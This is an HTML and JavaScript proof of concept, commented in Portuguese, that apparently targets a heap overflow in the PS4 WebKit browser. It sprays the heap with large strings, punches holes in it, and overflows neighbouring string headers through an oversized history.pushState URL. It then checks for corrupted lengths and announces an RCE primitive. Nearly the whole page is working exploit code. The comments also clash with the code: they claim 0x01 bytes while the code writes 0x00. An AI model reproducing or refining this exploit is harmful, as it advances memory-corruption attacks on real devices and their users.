<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit: Safe Flood (0x00)</title>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
        .success { color: #fff; background: #008800; padding: 10px; font-weight: bold; border: 2px solid #0f0;}
        button { font-size: 16px; padding: 10px; background: #333; color: white; border: 1px solid #666; cursor: pointer; margin-top: 20px;}
    </style>
</head>
<body>

<h2>WebKit Heap: Safe Flood Strategy</h2>
<p>Hipótese: 0x00-0x19 passam pelo filtro. 0x20+ crasham por encoding (%20).</p>
<p>Teste: Inundar com <strong>128 bytes de 0x01</strong>.</p>

<button onclick="runTest()">DISPARAR SAFE FLOOD (0x01)</button>

<div id="log" style="margin-top:20px;"></div>

<script>
    const MB = 1024 * 1024;
    const VICTIM_SIZE = MB; 
    const SPRAY_COUNT = 512; 
    var victims = new Array(SPRAY_COUNT);

    function log(msg, type="") {
        const el = document.getElementById('log');
        el.innerHTML = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
    }

    function runTest() {
        document.getElementById('log').innerHTML = "";
        
        // 1. SPRAY
        log("1. Preparando Heap (1MB Victims)...");
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let header = `ID:${i}-`; 
            let padding = "B".repeat(VICTIM_SIZE - header.length);
            victims[i] = header + padding;
        }

        // 2. HOLES
        log("2. Criando Buracos...");
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i += 4) {
            victims[i] = null;
        }
        
        // GC Force
        for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }

        // 3. TRIGGER
        setTimeout(() => {
            log("3. Disparando FLOOD de 0x01...");
            
            const SAFE_SIZE = 709522; 
            const BASE = "A".repeat(SAFE_SIZE);
            
            // ESTRATÉGIA NOVA:
            // Usamos \x01 porque está na sua zona "segura" (< 0x20).
            // Mas usamos MUITOS bytes para garantir que o cabeçalho do vizinho seja varrido.
            // Se 128 bytes de 0x01 passarem, o cabeçalho do vizinho vira 0x01010101...
            const OVERFLOW = "\x00".repeat(128); 
            
            const payload = "/" + BASE + OVERFLOW;

            try {
                history.pushState({}, "poc", payload);
                log("Payload enviado. Verificando vítimas...");
                check();
            } catch(e) {
                log("Erro JS: " + e.message);
            }
        }, 1000);
    }

    function check() {
        let found = false;
        for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                
                // Se sobrescrevemos o cabeçalho com 0x010101..., o tamanho vai mudar.
                // O valor 0x01010101 é um número gigante positivo.
                if (v.length !== VICTIM_SIZE) {
                    log(`⚡ SUCESSO! Vítima ${i} corrompida com Flood 0x01!`, "success");
                    log(`Tamanho Novo: ${v.length}`, "success");
                    found = true;
                    alert("RCE PRIMITIVE CONFIRMED!");
                    break;
                }
                
                // Verificação Secundária: Conteúdo
                // Se o cabeçalho sobreviveu (improvável), mas os dados foram tocados
                if (v.charCodeAt(0) === 1) { // 1 = 0x01
                    log(`⚡ SUCESSO! Conteúdo da vítima ${i} virou 0x01!`, "success");
                    found = true;
                    break;
                }
            }
        }
        
        if (!found) {
            log("Falha: Nenhuma mudança detectada.");
            log("Diagnóstico: O byte 0x01 pode estar sendo ignorado silenciosamente.");
            log("Próximo passo: Tentar o byte 0x09 (Tab) ou 0x0C (Form Feed).");
        }
    }
</script>
</body>
</html>



